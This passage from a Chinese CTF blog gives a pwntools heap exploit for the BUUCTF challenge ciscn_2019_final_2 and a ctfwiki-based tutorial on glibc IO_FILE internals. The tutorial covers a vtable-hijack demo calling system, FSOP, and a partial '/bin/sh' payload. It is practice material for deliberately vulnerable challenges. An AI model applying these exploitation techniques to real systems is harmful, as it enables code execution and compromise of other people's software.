io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a>ciscn_2019_final_2</h2><p>（难）考点：</p><ul><li>文件描述符</li><li>uaf</li></ul><p>总结：dup2函数，修改<em>IO_2_1_stdin</em>结构体中的文件描述符字段（输入为0，配合dup2函数泄露flag文件），旧版libc2.27无edit的uaf，bss没有heaparray只有heapptr的时候用uaf一块tcache，然后改next指针来做处理，虽然没edit但是可以add后改（本身指向的就是自己）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./ciscn_final_2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk = show(<span class="number">2</span>) - <span class="number">0xa0</span></span><br><span class="line">    add(<span class="number">2</span>, chunk)</span><br><span class="line">    add(<span class="number">2</span>, chunk)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    stdin_fileno = ((show(<span class="number">1</span>) - <span class="number">96</span> - <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) - (libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]) + <span class="number">0x70</span></span><br><span class="line">    echo(<span class="built_in">hex</span>(stdin_fileno))</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>, stdin_fileno)</span><br><span class="line">    chunk = show(<span class="number">1</span>) + <span class="number">0x30</span></span><br><span class="line">    add(<span class="number">1</span>, chunk)</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    edit(<span class="string">&quot;flag出来吧&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29350</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;which command?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">choice, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;2: short int&quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line">    sa(<span class="string">&quot;your inode number:&quot;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    ru(<span class="string">&quot;what do you want to say at last?&quot;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;2: short int&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">show_type</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;which command?\n&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;TYPE:\n1: int\n2: short int\n&gt;&#x27;</span>, <span class="built_in">str</span>(show_type))</span><br><span class="line">    <span class="keyword">if</span> show_type == <span class="number">1</span>:</span><br><span class="line">        ru(<span class="string">&#x27;your int type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> show_type == <span class="number">2</span>:</span><br><span class="line">        ru(<span class="string">&#x27;your short type inode number :&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./ciscn_final&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16_2</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE相关利用</title>
      <link href="2021/07/27/IO-FILE/"/>
      <url>2021/07/27/IO-FILE/</url>
      
        <content type="html"><![CDATA[<p>总结自ctfwiki</p><h2 id="IO-FILE相关知识"><a href="#IO-FILE相关知识" class="headerlink" title="IO_FILE相关知识"></a>IO_FILE相关知识</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>_IO_list_all是_IO_FILE_plus类型的一个指针<br><code>extern struct _IO_FILE_plus *_IO_list_all</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>在第一部分， file 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。file结构在程序执行，fread、fwrite 等标准函数需要文件流指针来指引去调用虚表函数。特殊地， fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 file结构的指针来接收这个返回值。</p><p>在第二部分，刚刚谈到的虚表就是 _IO_jump_t 结构体，在此虚表中，有很多函数都调用其中的子函数，无论是关闭文件，还是报错输出等等，都有对应的字段，而这正是可以攻击者可以被利用的突破口。值得注意的是，在 _IO_list_all 结构体中，_IO_FILE 结构是完整嵌入其中，而 vtable 是一个虚表指针，它指向了 _IO_jump_t 结构体。一个是完整的，一个是指针，这点一定要切记。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>借用之前总结的<br><img src="https://l3mon629.github.io/post-images/1600588419695.png" alt=""></p><h3 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h3><p>听星盟师傅讲的公开课，推荐了raycp师傅的博客，IOFILE这一部分根据师傅的博客来复现总结一下</p><p>采取libc version为2.23</p><p>以fopen为例分析一个file函数的执行流程</p><h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h4><p>fopen实际上是_IO_new_fopen函数</p><p>定义位置为/libio/iofopen.c的34行</p><p><code>define _IO_new_fopen fopen</code></p><p>源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_fopen (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步入到__fopen_internal函数 源码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line">  <span class="comment">// 分配一块sizeof(struct locked_FILE)大小的空间来装结构体</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">// 初始化操作</span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_file_init (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据师傅的总结如下</p><blockquote><p>整个<code>__fopen_internal</code>函数包含四个部分：</p><ol><li><code>malloc</code>分配内存空间。</li><li><code>_IO_no_init</code> 对file结构体进行<code>null</code>初始化。</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li><li><code>_IO_file_fopen</code>执行系统调用打开文件。</li></ol></blockquote><h5 id="分配内存空间"><a href="#分配内存空间" class="headerlink" title="分配内存空间"></a>分配内存空间</h5><p>首先分配了一块内存空间来装locked_FILE结构体</p><p>结构体成员为_IO_FILE_plus，_IO_lock_t和_IO_wide_data类型的变量</p><p><img src="https://i.loli.net/2021/08/02/L7F2VPznYpkWfy9.png" alt=""></p><h5 id="IO-no-init对结构体初始化"><a href="#IO-no-init对结构体初始化" class="headerlink" title="_IO_no_init对结构体初始化"></a>_IO_no_init对结构体初始化</h5><p><img src="https://i.loli.net/2021/08/02/YGiPwth9po17WS2.png" alt=""></p><p>初始化成员fp（_IO_FILE_plus）的值，大部分都为null</p><h5 id="结构体链入-IO-list-all"><a href="#结构体链入-IO-list-all" class="headerlink" title="结构体链入_IO_list_all"></a>结构体链入_IO_list_all</h5><p>接下来执行_IO_file_init函数</p><p><img src="https://i.loli.net/2021/08/02/EAokLgltTYJQj7v.png" alt=""></p><p>重要的是调用了link in函数，看名字就知道应该是这个函数操作了链入</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 改fp的chain链</span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">    <span class="comment">// 改_IO_list_all</span></span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改之前：_IO_list_all指向stderr</p><p><img src="https://i.loli.net/2021/08/02/fRN9FUO1ViJCPwA.png" alt=""></p><p>做完link in操作后：_IO_list_all指向fp，fp._chain指向stderr</p><p><img src="https://i.loli.net/2021/08/02/fpmKdFRYo6VeTh5.png" alt=""></p><h5 id="IO-file-fopen打开文件句柄"><a href="#IO-file-fopen打开文件句柄" class="headerlink" title="_IO_file_fopen打开文件句柄"></a>_IO_file_fopen打开文件句柄</h5><p>首先会进入_IO_new_file_fopen函数</p><p><img src="https://i.loli.net/2021/08/02/cQstGUBLpAwv6hZ.png" alt="6.png"></p><p>设置文件的模式之类的操作</p><p>随后调用_IO_file_fopen函数</p><p><img src="https://i.loli.net/2021/08/02/NmaZu78cxrlTMXK.png" alt=""></p><p>_IO_file_fopen函数主要是调用了open系统调用，并且将文件描述符返回给fd的fileno字段</p><p><img src="https://i.loli.net/2021/08/02/NmaZu78cxrlTMXK.png" alt=""></p><p>执行完函数，观察fileno字段已被填入正确的文件描述符，文件正常打开</p><p><img src="https://i.loli.net/2021/08/02/lYn69xwXPWiMbVK.png" alt=""></p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>fopen首先申请内存，初始化结构体，然后链入链表，最后调用系统调用打开文件</p><h2 id="伪造vtable劫持程序流程"><a href="#伪造vtable劫持程序流程" class="headerlink" title="伪造vtable劫持程序流程"></a>伪造vtable劫持程序流程</h2><p>由于linux中一些常见的IO操作函数都需要经过FILE结构处理，尤其是_IO_FILE_plus结构中存在vtable，一些函数会去除vtable中的指针进行调用。<br>伪造vtable劫持程序的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现，覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针(反正就是控制指针就完了嗷)</p><p>看如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看内存分布</p><p><img src="https://i.loli.net/2021/08/02/9m2r1GLTNScKxEJ.png" alt=""></p><p>找到vtable的偏移然后改掉我们控制的一片内存空间，再在内存空间里相应位置的地方改成system之类的函数即可控制程序流</p><p><img src="https://i.loli.net/2021/08/02/uWgdeUJlqL9kAc1.png" alt=""></p><h3 id="vtable函数的调用情况"><a href="#vtable函数的调用情况" class="headerlink" title="vtable函数的调用情况"></a>vtable函数的调用情况</h3><p>调用情况如下：</p><blockquote><p>fopen函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p><p>fread函数中调用的vtable函数有：</p><ul><li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li></ul><p>fwrite 函数调用的vtable函数有：</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><p><code>fclose</code>函数调用的vtable函数有：</p><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li><li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li></ul></blockquote><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP = File Stream Oriented Programming</p><p>关键点：_IO_list_all指针</p><p>在没有涉及到文件的操作时，链表是这样的：_IO_list_all -&gt; stderr，stderr._chain -&gt; stdout，stdout._chain -&gt; stdin，FSOP就是伪造一块_IO_FILE_plus结构体代替原本的节点，再利用漏洞修改_IO_list_all的值为可控的内存区域</p><p>伪造之后还需要触发，触发的方法是调用_IO_flush_all_lockp函数，这个函数会刷新链表中的文件流，相当于对每个FILE调用fflush，对应会调用vtable中的_IO_overflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">// 判断缓冲区是否有数据，有则刷新</span></span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在如下情况中这个函数会被系统调用</p><ol><li>libc执行abort时</li><li>执行exit函数时</li><li>main函数返回时（执行了exit函数）</li></ol><h3 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h3><p>漏洞是可以溢出覆盖heap manager的指针，也就是相当于任意地址写</p><p>思路就是将指针写为stderr，然后直接在stderr中写，把某些字段改成system地址，vtable改为这个字段的地址-0x18（vtable的第四个字段为overflow）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(re(<span class="number">12</span>, <span class="number">0</span>), base=<span class="number">16</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address = leak</span><br><span class="line">echo(<span class="built_in">hex</span>(leak))</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]) * <span 